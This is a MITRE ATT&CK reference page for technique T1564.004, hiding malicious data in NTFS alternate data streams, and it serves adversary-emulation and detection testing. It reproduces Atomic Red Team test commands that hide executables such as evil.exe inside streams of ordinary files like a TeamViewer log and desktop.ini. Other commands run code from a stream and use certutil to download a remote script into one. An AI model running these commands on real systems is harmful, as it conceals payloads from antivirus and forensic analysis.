
# NTFS File Attributes

## Description

### MITRE Description

> Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Anti-virus', 'Host forensic analysis', 'Signature-based detection']
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1564/004

## Potential Commands

```
echo cmd /c echo "Shell code execution."> #{file_name}:adstest.txt
for /f "usebackq delims=?" %i in (#{file_name}:adstest.txt) do %i
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,c:\windows\system32\cmd.exe,>,`"#{ads_file_path}:#{ads_name}`""
echo "test" > #{file_name} | set-content -path test.txt -stream adstest.txt -value "test"
set-content -path #{file_name} -stream adstest.txt -value "test2"
set-content -path . -stream adstest.txt -value "test3"
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab
print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg
regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat
esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o
echo cmd /c echo "Shell code execution."> %temp%\T1564.004_has_ads_cmd.txt:#{ads_filename}
for /f "usebackq delims=?" %i in (%temp%\T1564.004_has_ads_cmd.txt:#{ads_filename}) do %i
echo "test" > $env:TEMP\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream #{ads_filename} -value "test"
set-content -path $env:TEMP\T1564.004_has_ads_powershell.txt -stream #{ads_filename} -value "test2"
set-content -path . -stream #{ads_filename} -value "test3"
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"C:\Users\Public\Libraries\yanki\desktop.ini:#{ads_name}`""
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:desktop.ini`""
```

## Commands Dataset

```
[{'command': 'type C:\\temp\\evil.exe > "C:\\Program Files '
             '(x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe"\n'
             'extrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\n'
             'findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > '
             'c:\\ADS\\\\file.txt:procexp.exe\n'
             'certutil.exe -urlcache -split -f '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 '
             'c:\\temp:ttt\n'
             'makecab c:\\ADS\\\\autoruns.exe '
             'c:\\ADS\\\\cabtest.txt:autoruns.cab\n'
             'print /D:c:\\ADS\\\\file.txt:autoruns.exe '
             'c:\\ADS\\\\Autoruns.exe\n'
             'reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg '
             'c:\\ADS\\\\file.txt:evilreg.reg\n'
             'regedit /E c:\\ADS\\\\file.txt:regfile.reg '
             'HKEY_CURRENT_USER\\MyCustomRegKey\n'
             'expand \\\\webdav\\folder\\file.bat '
             'c:\\ADS\\\\file.txt:file.bat\n'
             'esentutl.exe /y c:\\ADS\\\\autoruns.exe /d '
             'c:\\ADS\\\\file.txt:autoruns.exe /o \n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'},
 {'command': 'if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType '
             'Container)) {\n'
             '    New-Item -ItemType Directory -Force -Path '
             'C:\\Users\\Public\\Libraries\\yanki\n'
             '    }\n'
             'Start-Process -FilePath "$env:comspec" -ArgumentList '
             '"/c,type,c:\\windows\\system32\\cmd.exe,>,`"#{ads_file_path}:#{ads_name}`""\n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'},
 {'command': 'if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType '
             'Container)) {\n'
             '    New-Item -ItemType Directory -Force -Path '
             'C:\\Users\\Public\\Libraries\\yanki\n'
             '    }\n'
             'Start-Process -FilePath "$env:comspec" -ArgumentList '
             '"/c,type,#{payload_path},>,`"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:#{ads_name}`""\n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'},
 {'command': 'if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType '
             'Container)) {\n'
             '    New-Item -ItemType Directory -Force -Path '
             'C:\\Users\\Public\\Libraries\\yanki\n'
             '    }\n'
             'Start-Process -FilePath "$env:comspec" -ArgumentList '
             '"/c,type,#{payload_path},>,`"#{ads_file_path}:desktop.ini`""\n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'},
 {'command': 'echo cmd /c echo "Shell code execution."> '
             '%temp%\\T1564.004_has_ads_cmd.txt:#{ads_filename}\n'
             'for /f "usebackq delims=?" %i in '
             '(%temp%\\T1564.004_has_ads_cmd.txt:#{ads_filename}) do %i\n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'},
 {'command': 'echo cmd /c echo "Shell code execution."> '
             '#{file_name}:adstest.txt\n'
             'for /f "usebackq delims=?" %i in (#{file_name}:adstest.txt) do '
             '%i\n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'},
 {'command': 'echo "test" > $env:TEMP\\T1564.004_has_ads_powershell.txt | '
             'set-content -path test.txt -stream #{ads_filename} -value '
             '"test"\n'
             'set-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt '
             '-stream #{ads_filename} -value "test2"\n'
             'set-content -path . -stream #{ads_filename} -value "test3"\n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'},
 {'command': 'echo "test" > #{file_name} | set-content -path test.txt -stream '
             'adstest.txt -value "test"\n'
             'set-content -path #{file_name} -stream adstest.txt -value '
             '"test2"\n'
             'set-content -path . -stream adstest.txt -value "test3"\n',
  'name': None,
  'source': 'atomics/T1564.004/T1564.004.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Hide Artifacts: NTFS File Attributes': {'atomic_tests': [{'auto_generated_guid': '8822c3b0-d9f9-4daf-a043-49f4602364f4',
                                                                                    'description': 'Execute '
                                                                                                   'from '
                                                                                                   'Alternate '
                                                                                                   'Streams\n'
                                                                                                   '\n'
                                                                                                   '[Reference '
                                                                                                   '- '
                                                                                                   '1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n'
                                                                                                   '\n'
                                                                                                   '[Reference '
                                                                                                   '- '
                                                                                                   '2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n',
                                                                                    'executor': {'command': 'type '
                                                                                                            'C:\\temp\\evil.exe '
                                                                                                            '> '
                                                                                                            '"C:\\Program '
                                                                                                            'Files '
                                                                                                            '(x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe"\n'
                                                                                                            'extrac32 '
                                                                                                            '#{path}\\procexp.cab '
                                                                                                            '#{path}\\file.txt:procexp.exe\n'
                                                                                                            'findstr '
                                                                                                            '/V '
                                                                                                            '/L '
                                                                                                            'W3AllLov3DonaldTrump '
                                                                                                            '#{path}\\procexp.exe '
                                                                                                            '> '
                                                                                                            '#{path}\\file.txt:procexp.exe\n'
                                                                                                            'certutil.exe '
                                                                                                            '-urlcache '
                                                                                                            '-split '
                                                                                                            '-f '
                                                                                                            'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 '
                                                                                                            'c:\\temp:ttt\n'
                                                                                                            'makecab '
                                                                                                            '#{path}\\autoruns.exe '
                                                                                                            '#{path}\\cabtest.txt:autoruns.cab\n'
                                                                                                            'print '
                                                                                                            '/D:#{path}\\file.txt:autoruns.exe '
                                                                                                            '#{path}\\Autoruns.exe\n'
                                                                                                            'reg '
                                                                                                            'export '
                                                                                                            'HKLM\\SOFTWARE\\Microsoft\\Evilreg '
                                                                                                            '#{path}\\file.txt:evilreg.reg\n'
                                                                                                            'regedit '
                                                                                                            '/E '
                                                                                                            '#{path}\\file.txt:regfile.reg '
                                                                                                            'HKEY_CURRENT_USER\\MyCustomRegKey\n'
                                                                                                            'expand '
                                                                                                            '\\\\webdav\\folder\\file.bat '
                                                                                                            '#{path}\\file.txt:file.bat\n'
                                                                                                            'esentutl.exe '
                                                                                                            '/y '
                                                                                                            '#{path}\\autoruns.exe '
                                                                                                            '/d '
                                                                                                            '#{path}\\file.txt:autoruns.exe '
                                                                                                            '/o \n',
                                                                                                 'elevation_required': True,
                                                                                                 'name': 'command_prompt'},
                                                                                    'input_arguments': {'path': {'default': 'c:\\ADS\\',
                                                                                                                 'description': 'Path '
                                                                                                                                'of '
                                                                                                                                'ADS '
                                                                                                                                'file',
                                                                                                                 'type': 'path'}},
                                                                                    'name': 'Alternate '
                                                                                            'Data '
                                                                                            'Streams '
                                                                                            '(ADS)',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '2ab75061-f5d5-4c1a-b666-ba2a50df5b02',
                                                                                    'description': 'Storing '
                                                                                                   'files '
                                                                                                   'in '
                                                                                                   'Alternate '
                                                                                                   'Data '
                                                                                                   'Stream '
                                                                                                   '(ADS) '
                                                                                                   'similar '
                                                                                                   'to '
                                                                                                   'Astaroth '
                                                                                                   'malware.\n'
                                                                                                   'Upon '
                                                                                                   'execution '
                                                                                                   'cmd '
                                                                                                   'will '
                                                                                                   'run '
                                                                                                   'and '
                                                                                                   'attempt '
                                                                                                   'to '
                                                                                                   'launch '
                                                                                                   'desktop.ini. '
                                                                                                   'No '
                                                                                                   'windows '
                                                                                                   'remain '
                                                                                                   'open '
                                                                                                   'after '
                                                                                                   'the '
                                                                                                   'test\n',
                                                                                    'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                    '"#{ads_file_path}" '
                                                                                                                    '-Force '
                                                                                                                    '-ErrorAction '
                                                                                                                    'Ignore\n',
                                                                                                 'command': 'if '
                                                                                                            '(!(Test-Path '
                                                                                                            'C:\\Users\\Public\\Libraries\\yanki '
                                                                                                            '-PathType '
                                                                                                            'Container)) '
                                                                                                            '{\n'
                                                                                                            '    '
                                                                                                            'New-Item '
                                                                                                            '-ItemType '
                                                                                                            'Directory '
                                                                                                            '-Force '
                                                                                                            '-Path '
                                                                                                            'C:\\Users\\Public\\Libraries\\yanki\n'
                                                                                                            '    '
                                                                                                            '}\n'
                                                                                                            'Start-Process '
                                                                                                            '-FilePath '
                                                                                                            '"$env:comspec" '
                                                                                                            '-ArgumentList '
                                                                                                            '"/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""\n',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'ads_file_path': {'default': 'C:\\Users\\Public\\Libraries\\yanki\\desktop.ini',
                                                                                                                          'description': 'Path '
                                                                                                                                         'of '
                                                                                                                                         'file '
                                                                                                                                         'to '
                                                                                                                                         'create '
                                                                                                                                         'an '
                                                                                                                                         'ADS '
                                                                                                                                         'under',
                                                                                                                          'type': 'path'},
                                                                                                        'ads_name': {'default': 'desktop.ini',
                                                                                                                     'description': 'Name '
                                                                                                                                    'of '
                                                                                                                                    'ADS',
                                                                                                                     'type': 'string'},
                                                                                                        'payload_path': {'default': 'c:\\windows\\system32\\cmd.exe',
                                                                                                                         'description': 'Path '
                                                                                                                                        'of '
                                                                                                                                        'file '
                                                                                                                                        'to '
                                                                                                                                        'hide '
                                                                                                                                        'in '
                                                                                                                                        'ADS',
                                                                                                                         'type': 'path'}},
                                                                                    'name': 'Store '
                                                                                            'file '
                                                                                            'in '
                                                                                            'Alternate '
                                                                                            'Data '
                                                                                            'Stream '
                                                                                            '(ADS)',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '17e7637a-ddaf-4a82-8622-377e20de8fdb',
                                                                                    'description': 'Create '
                                                                                                   'an '
                                                                                                   'Alternate '
                                                                                                   'Data '
                                                                                                   'Stream '
                                                                                                   'with '
                                                                                                   'the '
                                                                                                   'command '
                                                                                                   'prompt. '
                                                                                                   'Write '
                                                                                                   'access '
                                                                                                   'is '
                                                                                                   'required. '
                                                                                                   'Upon '
                                                                                                   'execution, '
                                                                                                   'run '
                                                                                                   '"dir '
                                                                                                   '/a-d '
                                                                                                   '/s '
                                                                                                   '/r '
                                                                                                   '| '
                                                                                                   'find '
                                                                                                   '":$DATA"" '
                                                                                                   'in '
                                                                                                   'the '
                                                                                                   '%temp%\n'
                                                                                                   'folder '
                                                                                                   'to '
                                                                                                   'view '
                                                                                                   'that '
                                                                                                   'the '
                                                                                                   'alternate '
                                                                                                   'data '
                                                                                                   'stream '
                                                                                                   'exists. '
                                                                                                   'To '
                                                                                                   'view '
                                                                                                   'the '
                                                                                                   'data '
                                                                                                   'in '
                                                                                                   'the '
                                                                                                   'alternate '
                                                                                                   'data '
                                                                                                   'stream, '
                                                                                                   'run '
                                                                                                   '"notepad '
                                                                                                   'T1564.004_has_ads.txt:adstest.txt"\n',
                                                                                    'executor': {'cleanup_command': 'del '
                                                                                                                    '#{file_name} '
                                                                                                                    '>nul '
                                                                                                                    '2>&1\n',
                                                                                                 'command': 'echo '
                                                                                                            'cmd '
                                                                                                            '/c '
                                                                                                            'echo '
                                                                                                            '"Shell '
                                                                                                            'code '
                                                                                                            'execution."> '
                                                                                                            '#{file_name}:#{ads_filename}\n'
                                                                                                            'for '
                                                                                                            '/f '
                                                                                                            '"usebackq '
                                                                                                            'delims=?" '
                                                                                                            '%i '
                                                                                                            'in '
                                                                                                            '(#{file_name}:#{ads_filename}) '
                                                                                                            'do '
                                                                                                            '%i\n',
                                                                                                 'name': 'command_prompt'},
                                                                                    'input_arguments': {'ads_filename': {'default': 'adstest.txt',
                                                                                                                         'description': 'Name '
                                                                                                                                        'of '
                                                                                                                                        'ADS.',
                                                                                                                         'type': 'string'},
                                                                                                        'file_name': {'default': '%temp%\\T1564.004_has_ads_cmd.txt',
                                                                                                                      'description': 'File '
                                                                                                                                     'name '
                                                                                                                                     'of '
                                                                                                                                     'file '
                                                                                                                                     'to '
                                                                                                                                     'create '
                                                                                                                                     'ADS '
                                                                                                                                     'on.',
                                                                                                                      'type': 'string'}},
                                                                                    'name': 'Create '
                                                                                            'ADS '
                                                                                            'command '
                                                                                            'prompt',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '0045ea16-ed3c-4d4c-a9ee-15e44d1560d1',
                                                                                    'dependencies': [{'description': 'The '
                                                                                                                     'file '
                                                                                                                     'must '
                                                                                                                     'exist '
                                                                                                                     'on '
                                                                                                                     'disk '
                                                                                                                     'at '
                                                                                                                     'specified '
                                                                                                                     'location '
                                                                                                                     '(#{file_name})\n',
                                                                                                      'get_prereq_command': 'New-Item '
                                                                                                                            '-Path '
                                                                                                                            '#{file_name} '
                                                                                                                            '| '
                                                                                                                            'Out-Null\n',
                                                                                                      'prereq_command': 'if '
                                                                                                                        '(Test-Path '
                                                                                                                        '#{file_name}) '
                                                                                                                        '{ '
                                                                                                                        'exit '
                                                                                                                        '0 '
                                                                                                                        '} '
                                                                                                                        'else '
                                                                                                                        '{ '
                                                                                                                        'exit '
                                                                                                                        '1 '
                                                                                                                        '}\n'}],
                                                                                    'dependency_executor_name': 'powershell',
                                                                                    'description': 'Create '
                                                                                                   'an '
                                                                                                   'Alternate '
                                                                                                   'Data '
                                                                                                   'Stream '
                                                                                                   'with '
                                                                                                   'PowerShell. '
                                                                                                   'Write '
                                                                                                   'access '
                                                                                                   'is '
                                                                                                   'required. '
                                                                                                   'To '
                                                                                                   'verify '
                                                                                                   'execution, '
                                                                                                   'the '
                                                                                                   'the '
                                                                                                   'command '
                                                                                                   '"ls '
                                                                                                   '-Recurse '
                                                                                                   '| '
                                                                                                   '%{ '
                                                                                                   'gi '
                                                                                                   '$_.Fullname '
                                                                                                   '-stream '
                                                                                                   '*} '
                                                                                                   '| '
                                                                                                   'where '
                                                                                                   'stream '
                                                                                                   '-ne '
                                                                                                   "':$Data' "
                                                                                                   '| '
                                                                                                   'Select-Object '
                                                                                                   'pschildname"\n'
                                                                                                   'in '
                                                                                                   'the '
                                                                                                   '%temp% '
                                                                                                   'direcotry '
                                                                                                   'to '
                                                                                                   'view '
                                                                                                   'all '
                                                                                                   'files '
                                                                                                   'with '
                                                                                                   'hidden '
                                                                                                   'data '
                                                                                                   'streams. '
                                                                                                   'To '
                                                                                                   'view '
                                                                                                   'the '
                                                                                                   'data '
                                                                                                   'in '
                                                                                                   'the '
                                                                                                   'alternate '
                                                                                                   'data '
                                                                                                   'stream, '
                                                                                                   'run '
                                                                                                   '"notepad.exe '
                                                                                                   'T1564.004_has_ads_powershell.txt:adstest.txt" '
                                                                                                   'in '
                                                                                                   'the '
                                                                                                   '%temp% '
                                                                                                   'folder.\n',
                                                                                    'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                    '-Path '
                                                                                                                    '#{file_name} '
                                                                                                                    '-ErrorAction '
                                                                                                                    'Ignore\n',
                                                                                                 'command': 'echo '
                                                                                                            '"test" '
                                                                                                            '> '
                                                                                                            '#{file_name} '
                                                                                                            '| '
                                                                                                            'set-content '
                                                                                                            '-path '
                                                                                                            'test.txt '
                                                                                                            '-stream '
                                                                                                            '#{ads_filename} '
                                                                                                            '-value '
                                                                                                            '"test"\n'
                                                                                                            'set-content '
                                                                                                            '-path '
                                                                                                            '#{file_name} '
                                                                                                            '-stream '
                                                                                                            '#{ads_filename} '
                                                                                                            '-value '
                                                                                                            '"test2"\n'
                                                                                                            'set-content '
                                                                                                            '-path '
                                                                                                            '. '
                                                                                                            '-stream '
                                                                                                            '#{ads_filename} '
                                                                                                            '-value '
                                                                                                            '"test3"\n',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'ads_filename': {'default': 'adstest.txt',
                                                                                                                         'description': 'Name '
                                                                                                                                        'of '
                                                                                                                                        'ADS '
                                                                                                                                        'file.',
                                                                                                                         'type': 'string'},
                                                                                                        'file_name': {'default': '$env:TEMP\\T1564.004_has_ads_powershell.txt',
                                                                                                                      'description': 'File '
                                                                                                                                     'name '
                                                                                                                                     'of '
                                                                                                                                     'file '
                                                                                                                                     'to '
                                                                                                                                     'create '
                                                                                                                                     'ADS '
                                                                                                                                     'on.',
                                                                                                                      'type': 'string'}},
                                                                                    'name': 'Create '
                                                                                            'ADS '
                                                                                            'PowerShell',
                                                                                    'supported_platforms': ['windows']}],
                                                                  'attack_technique': 'T1564.004',
                                                                  'display_name': 'Hide '
                                                                                  'Artifacts: '
                                                                                  'NTFS '
                                                                                  'File '
                                                                                  'Attributes'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Restrict File and Directory Permissions](../mitigations/Restrict-File-and-Directory-Permissions.md)


# Actors


* [APT32](../actors/APT32.md)

